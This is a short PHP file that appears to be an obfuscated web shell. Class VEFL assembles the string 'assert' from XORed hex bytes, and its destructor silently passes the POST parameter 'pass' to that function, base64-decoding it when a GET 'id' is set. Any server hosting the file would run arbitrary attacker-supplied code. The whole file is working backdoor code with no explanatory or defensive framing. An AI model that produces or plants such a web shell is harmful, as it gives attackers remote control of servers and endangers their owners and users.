<?php 
class VEFL { 
    function MzwK() {
        $YGNQ = "\x29" ^ "\x48";
        $bCcE = "\x89" ^ "\xfa";
        $CdqT = "\xe5" ^ "\x96";
        $SbNc = "\x84" ^ "\xe1";
        $cZxI = "\x31" ^ "\x43";
        $YFNz = "\xfc" ^ "\x88";
        $JfMP =$YGNQ.$bCcE.$CdqT.$SbNc.$cZxI.$YFNz;
        return $JfMP;
    }
    function __destruct(){
        $dvuR=$this->MzwK();
        @$dvuR($this->sc);
    }
}
$vefl = new VEFL();
@$vefl->sc = isset($_GET['id'])?base64_decode($_POST['pass']):$_POST['pass'];
?>